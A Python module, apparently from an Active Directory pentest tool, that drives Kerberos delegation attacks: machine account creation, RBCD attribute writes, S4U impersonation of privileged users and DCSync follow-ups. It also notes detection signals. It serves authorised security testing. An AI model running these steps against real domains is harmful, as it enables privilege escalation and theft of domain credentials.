"""CLI orchestration for Kerberos delegation enumeration and exploitation.

This module keeps delegation *UI + reporting* logic out of the monolith.
The service layer performs the tool execution and basic parsing; this module:
- resolves workspace paths
- prints operation headers
- updates reports + telemetry
- renders Rich tables
- handles user prompts for enumeration and exploitation
"""

from __future__ import annotations

import os
import subprocess
from typing import Protocol

from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.rich_output import (
    mark_sensitive,
    print_exception,
    print_panel,
)
from adscan_core.theme import (
    COLOR_AMBER,
    COLOR_CRIMSON,
    COLOR_SAGE,
)
from rich.prompt import Confirm

from adscan_internal.services.machine_account_provisioning_service import (
    record_machine_account_creation_result,
    register_managed_machine_account,
)


# ---------------------------------------------------------------------------
# Delegation-type pre-flight summaries
# ---------------------------------------------------------------------------
#
# Each entry maps a normalised delegation kind to: the plain-English vector
# description, what AD writes the exploit will perform, the OPSEC signals,
# and the "Next" follow-up move. These power _delegation_preflight_panel()
# so every exploit prompt explains itself rather than asking "yes/no?"
# behind a single-line jargon string.
_DELEGATION_PROFILES: dict[str, dict[str, object]] = {
    "unconstrained": {
        "title": "Unconstrained delegation, ticket capture",
        "vector": (
            "When the target service authenticates to a host trusting this "
            "principal for unconstrained delegation, the host receives the "
            "client's TGT in memory. Capturing that TGT yields full "
            "impersonation of the original client."
        ),
        "ad_changes": [
            "No persistent AD writes; capture is in-memory on the host.",
            "Optional coercion to force a privileged client to authenticate.",
        ],
        "opsec": [
            "Event 4768 / 4769 on the KDC when the forwarded TGT is reused.",
            "MDI rule 'Suspected use of forged Kerberos ticket' on misuse.",
        ],
        "next": "Forge a silver / golden ticket from the captured TGT.",
    },
    "constrained": {
        "title": "Constrained delegation, S4U2Self + S4U2Proxy",
        "vector": (
            "The principal can request service tickets for any user on the "
            "configured allowed SPNs (msDS-AllowedToDelegateTo). With "
            "protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION), the "
            "S4U2Self step does not require the user's authenticator."
        ),
        "ad_changes": [
            "No AD writes during exploitation, just S4U requests to the KDC.",
            "Service ticket cached locally and persisted in the workspace.",
        ],
        "opsec": [
            "Event 4769 on the KDC carrying ticket option 0x40810000.",
            "MDI 'Suspected identity theft (pass-the-ticket)' if reused widely.",
        ],
        "next": "Use the cached service ticket against the allowed SPN.",
    },
    "rbcd": {
        "title": "Resource-Based Constrained Delegation (RBCD)",
        "vector": (
            "Writing msDS-AllowedToActOnBehalfOfOtherIdentity on the target "
            "computer allows the actor machine account to impersonate any "
            "principal to that target. S4U2Self + S4U2Proxy then mints a "
            "service ticket as a privileged user."
        ),
        "ad_changes": [
            "LDAP write on msDS-AllowedToActOnBehalfOfOtherIdentity on the target.",
            "Optional: SAMR creation of a new machine account when MAQ > 0.",
        ],
        "opsec": [
            "Event 5136 on the PDC for the SD modification on the target.",
            "Event 4741 if a new machine account is created via SAMR.",
            "MDI rule 'Suspicious modification of an attribute' on RBCD writes.",
        ],
        "next": "Run S4U2Self + S4U2Proxy with the actor machine account.",
    },
}


def _normalize_delegation_kind(raw: str) -> str:
    value = (raw or "").strip().lower()
    if "unconstrained" in value:
        return "unconstrained"
    if "rbcd" in value or "resource" in value or "based" in value:
        return "rbcd"
    if "constrained" in value:
        return "constrained"
    return value or "constrained"


def _print_delegation_preflight_panel(
    *,
    delegation_kind: str,
    marked_username: str,
    marked_target: str,
) -> None:
    """Render the pre-flight context panel for a delegation exploit prompt.

    The panel always renders before a Confirm.ask, so the operator sees the
    vector, planned AD changes, OPSEC signals, and the Next step before
    deciding. Falls back to a single warning line if the kind is unknown.
    """
    profile = _DELEGATION_PROFILES.get(_normalize_delegation_kind(delegation_kind))
    if profile is None:
        print_warning(
            f"Delegation exploit available for {marked_target} via {marked_username}."
        )
        return

    body_lines: list[str] = []
    body_lines.append(f"[bold]Principal:[/bold] {marked_username}")
    body_lines.append(f"[bold]Target:[/bold]    {marked_target}")
    body_lines.append("")
    body_lines.append("[bold]Why it works[/bold]")
    body_lines.append(f"  {profile['vector']}")
    body_lines.append("")
    body_lines.append("[bold]Planned AD changes[/bold]")
    for item in profile["ad_changes"]:  # type: ignore[index]
        body_lines.append(f"  - {item}")
    body_lines.append("")
    body_lines.append("[bold]Detection signals[/bold]")
    for item in profile["opsec"]:  # type: ignore[index]
        body_lines.append(f"  ! {item}")
    body_lines.append("")
    body_lines.append(f"[bold]Next:[/bold] {profile['next']}")

    # RBCD is the least-noisy of the three, render it in amber; the other two
    # leave clear ticket-issue trails on the KDC, render them in crimson to
    # match the "louder" detection footprint.
    border = COLOR_AMBER if _normalize_delegation_kind(delegation_kind) == "rbcd" else COLOR_CRIMSON
    print_panel(
        "\n".join(body_lines),
        title=f"[bold {border}]{profile['title']}[/bold {border}]",
        border_style=border,
        expand=False,
    )


def _print_s4u_success_panel(
    *,
    delegation_kind: str,
    marked_impersonated: str,
    marked_target: str,
    marked_ticket_path: str,
    next_hint: str,
) -> None:
    """Verdict-first success panel for an S4U-derived service ticket."""
    kind = _normalize_delegation_kind(delegation_kind)
    headline = {
        "unconstrained": "Unconstrained delegation, TGT captured",
        "constrained": "Constrained delegation, service ticket minted",
        "rbcd": "RBCD service ticket minted",
    }.get(kind, "Delegation service ticket minted")
    body = (
        f"[bold {COLOR_SAGE}]✓ {headline}[/bold {COLOR_SAGE}]\n\n"
        f"[bold]Impersonated:[/bold]  {marked_impersonated}\n"
        f"[bold]Target SPN:[/bold]    {marked_target}\n"
        f"[bold]Ticket cache:[/bold]  {marked_ticket_path}\n\n"
        f"[bold]Next:[/bold] {next_hint}"
    )
    print_panel(
        body,
        title=f"[bold {COLOR_SAGE}]Delegation success[/bold {COLOR_SAGE}]",
        border_style=COLOR_SAGE,
        expand=False,
    )


def _map_delegation_failure_hint(message: str) -> str:
    """Map a raw S4U / RBCD failure message to a short actionable hint."""
    lowered = (message or "").lower()
    if not lowered:
        return "Inspect the workspace log for the underlying Kerberos error."
    if "not_for_user" in lowered or "kdc_err_badoption" in lowered:
        return (
            "Likely cause: target service is in Protected Users or "
            "msDS-AllowedToDelegateTo / RBCD attribute does not include it."
        )
    if "logon_denied" in lowered or "sec_e_logon_denied" in lowered:
        return (
            "Likely cause: Kerberos ticket SPN mismatch. Confirm the target "
            "FQDN matches the SPN and that DNS resolves correctly."
        )
    if "skew" in lowered:
        return (
            "Likely cause: clock skew with the KDC. Run the time-sync flow "
            "and retry."
        )
    if "etype" in lowered or "encryption" in lowered:
        return (
            "Likely cause: AES-only KDC or RC4 disabled. Re-run with the "
            "AES key (posture detection should pick this up automatically)."
        )
    if "access" in lowered and "deni" in lowered:
        return (
            "Likely cause: the principal does not actually hold the "
            "delegation rights at runtime. Re-run the LDAP collector."
        )
    return "Inspect the workspace log for the underlying Kerberos error."


# ---------------------------------------------------------------------------


class DelegationShell(Protocol):
    """Minimal shell surface used by the delegation controller."""

    console: object
    domains: list[str]
    domains_dir: str
    domain: str | None
    type: str | None
    auto: bool
    scan_mode: str | None
    current_workspace_dir: str | None
    domains_data: dict
    impacket_scripts_dir: str | None
    command_runner: object
    license_mode: object

    def _get_workspace_cwd(self) -> str: ...

    def _get_lab_slug(self) -> str | None: ...

    def build_auth_impacket_no_host(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def check_maq(self, domain: str, username: str, password: str) -> int: ...

    def get_delegatable_privileged_user(self, domain: str) -> str | None: ...

    def is_computer_dc(self, domain: str, hostname: str) -> bool: ...

    def return_credentials(self, domain: str) -> tuple[str | None, str | None]: ...

    def update_report_field(self, domain: str, field: str, value: object) -> None: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dcsync(self, domain: str, username: str, ticket: str) -> None: ...

    def dcsync(self, domain: str, username: str, ticket: str) -> None: ...

    def add_credential(
        self,
        domain: str,
        user: str,
        cred: str,
        host: str | None = None,
        service: str | None = None,
        skip_hash_cracking: bool = False,
        pdc_ip: str | None = None,
        source_steps: list[object] | None = None,
        prompt_for_user_privs_after: bool = True,
        skip_user_privs_enumeration: bool = False,
        verify_credential: bool = True,
        verify_local_credential: bool = True,
        prompt_local_reuse_after: bool = True,
        ui_silent: bool = False,
        ensure_fresh_kerberos_ticket: bool = True,
        force_authenticated_enumeration: bool = False,
        prompt_when_already_authenticated: bool = False,
        allow_empty_credential: bool = False,
        trusted_manual_validation: bool = False,
    ) -> None: ...


def ask_for_exploit_delegation(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_type: str,
    delegation_to: str,
) -> None:
    """Prompt user to exploit a delegation."""
    from adscan_internal.rich_output import mark_sensitive

    marked_delegation_to = mark_sensitive(delegation_to, "service")
    marked_username = mark_sensitive(username, "user")

    # Pre-flight context: render the vector + AD changes + OPSEC + Next step
    # so the operator decides with the full picture rather than from the
    # one-liner Confirm.ask string.
    _print_delegation_preflight_panel(
        delegation_kind=delegation_type,
        marked_username=marked_username,
        marked_target=marked_delegation_to,
    )

    respuesta = Confirm.ask(
        f"Exploit {delegation_type} delegation on {marked_delegation_to} "
        f"as {marked_username}?",
        default=True,
    )
    if respuesta:
        if delegation_type.lower() == "constrained":
            exploit_delegation_rbcd(shell, domain, username, password, delegation_to)
        elif delegation_type == "Constrained w/ Protocol Transition":
            exploit_delegation_constrained(
                shell, domain, username, password, delegation_to
            )


def _run_s4u_native(
    shell: DelegationShell,
    *,
    domain: str,
    username: str,
    password: str,
    impersonate_user: str,
    service_spn: str,
    ccache_output_path: str,
) -> object:
    """Run native S4U (S4U2Self + S4U2Proxy) via kerbad. Raises on failure."""
    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
        run_s4u_get_st_native,
    )
    domain_info = shell.domains_data.get(domain) or {}
    kdc_ip = str(domain_info.get("pdc") or "").strip()
    if not kdc_ip:
        raise RuntimeError(f"No PDC IP found for domain {domain!r}; cannot run S4U.")
    nt_hash: str | None = None
    plain_password = password
    if (
        password
        and len(password) == 32
        and all(c in "0123456789abcdefABCDEF" for c in password)
    ):
        nt_hash = password
        plain_password = ""
    return run_s4u_get_st_native(
        domain=domain,
        kdc_ip=kdc_ip,
        username=username,
        password=plain_password,
        nt_hash=nt_hash,
        impersonate_user=impersonate_user,
        service_spn=service_spn,
        ccache_output_path=ccache_output_path,
    )


def exploit_delegation_constrained(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_to: str,
    *,
    chain_dcsync_followup: bool = True,
) -> None:
    from adscan_internal.rich_output import mark_sensitive

    try:
        target_host = (
            delegation_to.split("/")[1] if "/" in delegation_to else delegation_to
        )
        target_user = shell.get_delegatable_privileged_user(domain)

        marked_target_host = mark_sensitive(target_host, "hostname")
        print_info(f"Exploiting constrained delegation against {marked_target_host}")

        try:
            properties = {
                "delegation_type": "constrained_protocol_transition",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # Native S4U: kerbad handles the S4U2Self+S4U2Proxy chain, including
        # protocol-transition branching when TRUSTED_TO_AUTH is set.
        ccache_path = os.path.join(
            shell._get_workspace_cwd(),
            f"{target_user}@{target_host}.{domain}.ccache",
        )
        native = _run_s4u_native(
            shell,
            domain=domain,
            username=username,
            password=password,
            impersonate_user=target_user or "",
            service_spn=delegation_to,
            ccache_output_path=ccache_path,
        )
        _handle_constrained_native_result(
            shell,
            native,
            domain=domain,
            target_host=target_host,
            target_user=target_user or "",
            service_spn=delegation_to,
            owner_principal=username,
            chain_dcsync_followup=chain_dcsync_followup,
        )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error exploiting constrained delegation.")
        print_exception(show_locals=False, exception=e)


def _persist_service_ticket_after_s4u(
    shell: DelegationShell,
    *,
    domain: str,
    ccache_path: str,
    kind: str,
    owner_principal: str,
    impersonated_user: str,
    spn: str,
    target_host: str,
) -> None:
    """Register an S4U-derived service ticket in ``domains_data["service_tickets"]``.

    Service tickets produced by RBCD or constrained-delegation flows must
    NOT be stored in ``kerberos_tickets``: they are not TGTs. This is a thin
    wrapper over the shared :func:`persist_service_ticket` helper (single
    source of truth, shared with the RBCD chain) which parses the resulting
    ccache, extracts the issuance / expiry timestamps and persists a
    structured record so follow-up steps can locate the ticket by SPN/host
    instead of walking workspace files.

    Failures are logged at debug level and swallowed inside the shared helper:
    missing persistence is a soft loss (the ccache file is still on disk), not
    worth aborting an otherwise successful exploitation.
    """
    from adscan_internal.services.credential_store_service import (  # noqa: PLC0415
        persist_service_ticket,
    )

    persist_service_ticket(
        getattr(shell, "domains_data", {}),
        domain=domain,
        ccache_path=ccache_path,
        kind=kind,
        owner_principal=owner_principal,
        impersonated_user=impersonated_user,
        spn=spn,
        target_host=target_host,
    )


def _handle_constrained_native_result(
    shell: DelegationShell,
    result: object,
    *,
    domain: str,
    target_host: str,
    target_user: str,
    service_spn: str = "",
    owner_principal: str = "",
    chain_dcsync_followup: bool = True,
) -> None:
    # ``chain_dcsync_followup`` is the single-responsibility gate: during
    # attack-PATH execution it MUST be False — DCSync is its own graph edge that
    # the path runner executes as the next step, so chaining it here would
    # double-execute it (and the internal call resolves the ambient ccache, not
    # the just-minted service ticket). Standalone/manual delegation keeps the
    # convenience followup (default True).
    from adscan_internal.rich_output import mark_sensitive

    if result.success:
        marked_target_host = mark_sensitive(target_host, "hostname")
        if hasattr(shell, "_update_active_attack_graph_step_status"):
            try:
                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                    domain=domain,
                    status="success",
                    notes={"target_host": target_host, "impersonated": target_user},
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
        try:
            telemetry.capture(
                "delegation_exploitation_success",
                {
                    "delegation_type": "constrained_protocol_transition",
                    "ticket_obtained": result.ticket_path is not None,
                    "target_is_dc": shell.is_computer_dc(domain, target_host),
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                },
            )
        except Exception as e:
            telemetry.capture_exception(e)
        if result.ticket_path:
            _persist_service_ticket_after_s4u(
                shell,
                domain=domain,
                ccache_path=result.ticket_path,
                kind="constrained_delegation",
                owner_principal=owner_principal,
                impersonated_user=target_user,
                spn=service_spn,
                target_host=target_host,
            )
            target_is_dc = shell.is_computer_dc(domain, target_host)
            next_hint = (
                "Run DCSync with this ticket to dump replication secrets."
                if target_is_dc
                else f"Use the ticket against {target_host} with the allowed SPN."
            )
            _print_s4u_success_panel(
                delegation_kind="constrained",
                marked_impersonated=mark_sensitive(target_user, "user"),
                marked_target=mark_sensitive(service_spn or target_host, "service"),
                marked_ticket_path=mark_sensitive(result.ticket_path, "path"),
                next_hint=next_hint,
            )
            if target_is_dc and chain_dcsync_followup:
                shell.dcsync(domain, target_user, result.ticket_path)
        else:
            # Native call returned success but no ticket was produced; this is
            # rare but not impossible (in-memory cache only). Keep the legacy
            # one-liner so the audit log carries a marker.
            print_success(f"Command executed successfully on {marked_target_host}.")
    else:
        if hasattr(shell, "_update_active_attack_graph_step_status"):
            try:
                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                    domain=domain,
                    status="failed",
                    notes={"target_host": target_host, "impersonated": target_user},
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
        error_message = str(result.error_message or "unknown error")
        hint = _map_delegation_failure_hint(error_message)
        print_panel(
            (
                f"[bold {COLOR_CRIMSON}]✗ Constrained delegation failed[/bold {COLOR_CRIMSON}]\n\n"
                f"[bold]Reason:[/bold] {error_message}\n"
                f"[bold]Hint:[/bold]   {hint}"
            ),
            title=f"[bold {COLOR_CRIMSON}]Delegation failed[/bold {COLOR_CRIMSON}]",
            border_style=COLOR_CRIMSON,
            expand=False,
        )



def exploit_delegation_rbcd(
    shell: DelegationShell, domain: str, username: str, password: str, target: str
) -> None:
    """Coordinates the exploitation of constrained delegation."""
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Telemetry: track delegation exploitation attempt
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # First, check MAQ
        maq = shell.check_maq(domain, username, password)
        success = False

        if maq > 0:
            # If MAQ allows creating computers, continue with the original flow
            computer_name = "rbcd_computer$"
            computer_pass = "Password12321"

            marked_username = mark_sensitive(username, "user")
            print_success(
                f"Starting RBCD exploitation as {marked_username}"
            )

            # Step 1: Create new computer
            if shell.add_computer_to_domain(
                domain, computer_name, computer_pass, username, password
            ):
                # Step 2: Configure RBCD
                if shell.set_rbcd_delegation(
                    domain, computer_name, target, computer_pass, username, password
                ):
                    # Step 3: Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, computer_name, username, computer_pass
                    ):
                        # Step 4: Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        else:
            # If MAQ does not allow creating computers, use an existing one
            print_warning("MachineAccountQuota is 0, new computers cannot be created")
            print_info("Select an existing user to configure RBCD")

            selected_user, selected_cred = shell.return_credentials(domain)
            if selected_user and selected_cred:
                # Configure RBCD with the selected user
                if shell.set_rbcd_delegation(
                    domain, selected_user, target, selected_cred, username, password
                ):
                    # Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, selected_user, username, selected_cred
                    ):
                        # Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        # Telemetry: track exploitation result
        try:
            if success:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "used_new_computer": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_success", properties)
            else:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "maq_available": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e:
            telemetry.capture_exception(e)

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during constrained delegation exploitation.")
        print_exception(show_locals=False, exception=e)

        # Telemetry: track exception during exploitation
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "error": True,
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e2:
            telemetry.capture_exception(e2)


def add_computer_to_domain(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Adds a new computer to the domain."""
    try:
        if domain not in shell.domains:
            marked_target_domain = mark_sensitive(domain, "domain")
            print_error(
                f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
            )
            return None

        inventory = _load_ip_hostname_inventory(shell, domain)
        outcome = _run_addcomputer_native(
            domain=domain,
            domains_data=shell.domains_data,
            ip_hostname_inventory=inventory,
            username=username,
            password=password,
            computer_name=computer_name,
            computer_password=computer_pass,
        )

        if outcome.success:
            record_machine_account_creation_result(
                shell,
                domain=domain,
                actor_username=username,
                success=True,
            )
            print_success(f"Computer {computer_name}$ added successfully")
            machine_account = normalize_machine_account(computer_name)
            register_managed_machine_account(
                shell,
                domain=domain,
                sam_account_name=machine_account,
                password=computer_pass,
                created_by=username,
                source="authenticated_ldap",
            )
            # Inject the new machine account's primary-group membership into
            # the workspace snapshot.  Windows assigns primaryGroupID=515
            # (Domain Computers) automatically when SamrCreateUser2InDomain
            # is called with USER_WORKSTATION_TRUST_ACCOUNT, known by
            # construction, no LDAP roundtrip needed.  Without this, every
            # subsequent attack-path render falls back to LDAP queries that
            # return 0 results (computer primaryGroupID is not in the LDAP
            # ``member`` attribute the IN_CHAIN matching rule traverses).
            try:
                from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
                    add_runtime_computer_group_membership,
                )
                add_runtime_computer_group_membership(
                    shell,
                    domain,
                    computer_name=machine_account,
                    group_rid=515,
                    source="adscan_addcomputer_native",
                    evidence={
                        "primary_group_rid": 515,
                        "creation_method": "samr_create_user2",
                        "actor_username": username,
                    },
                    origin_kind="machine_account_creation",
                    origin_technique="addcomputer_samr",
                    origin_relation="AddComputer",
                    cleanup_behavior="remove_directory_and_runtime",
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                marked_machine = mark_sensitive(machine_account, "user")
                print_info_debug(
                    "[delegations] failed to inject primary-group membership for "
                    f"{marked_machine}: {type(exc).__name__}: {exc}"
                )
            try:
                shell.add_credential(
                    domain,
                    machine_account,
                    computer_pass,
                    prompt_for_user_privs_after=False,
                    skip_user_privs_enumeration=True,
                    ui_silent=True,
                    ensure_fresh_kerberos_ticket=True,
                    force_authenticated_enumeration=False,
                    prompt_when_already_authenticated=False,
                    credential_origin="machine_account",
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
                marked_machine = mark_sensitive(machine_account, "user")
                print_warning(
                    "The computer was created successfully, but ADscan could not "
                    f"persist the machine credential bootstrap for {marked_machine}."
                )
            return True
        if outcome.quota_exceeded:
            record_machine_account_creation_result(
                shell,
                domain=domain,
                actor_username=username,
                success=False,
                quota_exceeded=True,
                reason=outcome.output or "MachineAccountQuota exceeded for actor.",
            )
            marked_user = mark_sensitive(username, "user")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                "MachineAccountQuota exhausted for the current actor: "
                f"{marked_user} can no longer create additional machine accounts in {marked_domain}."
            )
        print_error(f"Error adding computer: {outcome.output or 'unknown error'}")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error adding computer.")
        print_exception(show_locals=False, exception=e)
        return False


def _load_ip_hostname_inventory(shell, domain: str) -> dict | None:
    """Load the workspace IP->hostname inventory for one domain, if available."""
    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    domains_dir = getattr(shell, "domains_dir", None) or ""
    if not workspace_dir or not domains_dir:
        return None
    try:
        from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
            load_workspace_ip_hostname_inventory,
        )

        return load_workspace_ip_hostname_inventory(
            workspace_dir=workspace_dir,
            domains_dir=domains_dir,
            domain=domain,
        )
    except Exception:
        return None


def _run_addcomputer_native(**kwargs):
    """Deferred native add-computer wrapper to keep CLI tests patchable."""
    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
        run_addcomputer_native,
    )

    return run_addcomputer_native(**kwargs)


def set_rbcd_delegation(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    target: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Configures RBCD for the created computer."""
    try:
        _ = computer_pass  # reserved for future reuse/cleanup flows
        from adscan_internal.services.exploitation.delegation_native import (
            run_rbcd_write_native,
        )

        inventory = _load_ip_hostname_inventory(shell, domain)
        outcome = run_rbcd_write_native(
            domain=domain,
            domains_data=shell.domains_data,
            ip_hostname_inventory=inventory,
            username=username,
            password=password,
            target_computer=target,
            actor_computer=computer_name,
        )

        if outcome.success:
            if outcome.already_had_delegation:
                print_success(
                    "RBCD was already configured: this machine account already had "
                    "the delegation privileges needed for this target (no changes were required)."
                )
            else:
                # Verdict-first panel with the exact attribute write and the
                # Next move, matching the backup_operators_escalation pattern.
                marked_actor = mark_sensitive(computer_name, "user")
                marked_target = mark_sensitive(target, "hostname")
                print_panel(
                    (
                        f"[bold {COLOR_SAGE}]✓ RBCD configured[/bold {COLOR_SAGE}]\n\n"
                        f"[bold]Target computer:[/bold]  {marked_target}\n"
                        f"[bold]Actor account:[/bold]    {marked_actor}\n"
                        f"[bold]Attribute write:[/bold]  "
                        f"msDS-AllowedToActOnBehalfOfOtherIdentity\n\n"
                        f"[bold]Next:[/bold] S4U2Self + S4U2Proxy with the "
                        f"actor account to mint a service ticket as a "
                        f"privileged user."
                    ),
                    title=f"[bold {COLOR_SAGE}]RBCD setup[/bold {COLOR_SAGE}]",
                    border_style=COLOR_SAGE,
                    expand=False,
                )
            return True

        hint = _map_delegation_failure_hint("")
        print_panel(
            (
                f"[bold {COLOR_CRIMSON}]✗ RBCD configuration failed[/bold {COLOR_CRIMSON}]\n\n"
                f"[bold]Reason:[/bold] could not write "
                f"msDS-AllowedToActOnBehalfOfOtherIdentity on the target.\n"
                f"[bold]Hint:[/bold]   {hint}"
            ),
            title=f"[bold {COLOR_CRIMSON}]RBCD failed[/bold {COLOR_CRIMSON}]",
            border_style=COLOR_CRIMSON,
            expand=False,
        )
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error configuring RBCD.")
        print_exception(show_locals=False, exception=e)
        return False


def create_forwardable_ticket(
    shell: DelegationShell,
    domain: str,
    s4u_account: str,
    username: str,
    s4u_password: str,
) -> bool:
    """Create a forwardable ticket using S4U via KerberosTicketService."""
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.kerberos_ticket_service import (
        KerberosTicketService,
    )

    try:
        # Get a privileged user that can be delegated
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            print_error("No privileged user found that can be delegated")
            return False

        # Normalize S4U account (drop trailing $ for computer accounts)
        if isinstance(s4u_account, str) and s4u_account.endswith("$"):
            s4u_account = s4u_account.rstrip("$")

        service = KerberosTicketService()
        result = service.create_forwardable_ticket_native(
            domain=domain,
            pdc_hostname=shell.domains_data[domain]["pdc_hostname"],
            pdc_ip=shell.domains_data[domain]["pdc"],
            target_user=target_user,
            s4u_account=s4u_account,
            s4u_password=s4u_password,
        )

        if result.success:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Forwardable ticket created successfully for domain {marked_domain}"
            )
            return True

        print_error(
            "Error creating forwardable ticket. Check logs for detailed information."
        )
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error creating forwardable ticket.")
        print_exception(show_locals=False, exception=e)
        return False


def launch_s4proxy(
    shell: DelegationShell,
    domain: str,
    target: str,
    username: str,
    password: str,
    *,
    prompt_for_dcsync_followup: bool = True,
) -> bool:
    """Launch the S4Proxy attack: native kerbad path first, getST.py fallback."""

    setattr(shell, "_last_delegation_launch_result", None)
    try:
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target,
                    "target_user": None,
                    "ticket_path": None,
                    "error": "No privileged user found that can be delegated",
                },
            )
            print_error("No privileged user found that can be delegated")
            return False

        ccache_path = os.path.join(
            shell._get_workspace_cwd(),
            f"{target_user}@{target}.{domain.upper()}.ccache",
        )
        native = _run_s4u_native(
            shell,
            domain=domain,
            username=username,
            password=password,
            impersonate_user=target_user,
            service_spn=target,
            ccache_output_path=ccache_path,
        )
        ticket = native.ticket_path if native.success else None
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": native.success,
                "target_spn": target,
                "target_user": target_user,
                "ticket_path": ticket,
                "error": native.error_message if not native.success else None,
            },
        )
        if native.success:
            if ticket:
                target_host_part = (
                    target.split("/", 1)[1] if "/" in target else target
                )
                _persist_service_ticket_after_s4u(
                    shell,
                    domain=domain,
                    ccache_path=ticket,
                    kind="rbcd",
                    owner_principal=username,
                    impersonated_user=target_user,
                    spn=target,
                    target_host=target_host_part,
                )
                target_is_dc = shell.is_computer_dc(domain, target_host_part)
                next_hint = (
                    "Run DCSync with this ticket to dump replication secrets."
                    if target_is_dc
                    else "Use the ticket against the target SPN for lateral movement."
                )
                _print_s4u_success_panel(
                    delegation_kind="rbcd",
                    marked_impersonated=mark_sensitive(target_user, "user"),
                    marked_target=mark_sensitive(target, "service"),
                    marked_ticket_path=mark_sensitive(ticket, "path"),
                    next_hint=next_hint,
                )
            else:
                print_success("S4Proxy executed successfully")
            if ticket and prompt_for_dcsync_followup:
                shell.ask_for_dcsync(domain, target_user, ticket)
            return True
        error_message = str(native.error_message or "unknown error")
        hint = _map_delegation_failure_hint(error_message)
        print_panel(
            (
                f"[bold {COLOR_CRIMSON}]✗ S4Proxy failed[/bold {COLOR_CRIMSON}]\n\n"
                f"[bold]Reason:[/bold] {error_message}\n"
                f"[bold]Hint:[/bold]   {hint}"
            ),
            title=f"[bold {COLOR_CRIMSON}]Delegation failed[/bold {COLOR_CRIMSON}]",
            border_style=COLOR_CRIMSON,
            expand=False,
        )
        return False

    except Exception as e:
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": False,
                "target_spn": target,
                "target_user": None,
                "ticket_path": None,
                "error": str(e),
            },
        )
        telemetry.capture_exception(e)
        print_error("Error executing S4Proxy.")
        print_exception(show_locals=False, exception=e)
        return False


def request_delegated_service_ticket(
    shell: DelegationShell,
    domain: str,
    target_spn: str,
    username: str,
    password: str,
    *,
    force_forwardable: bool = True,
) -> bool:
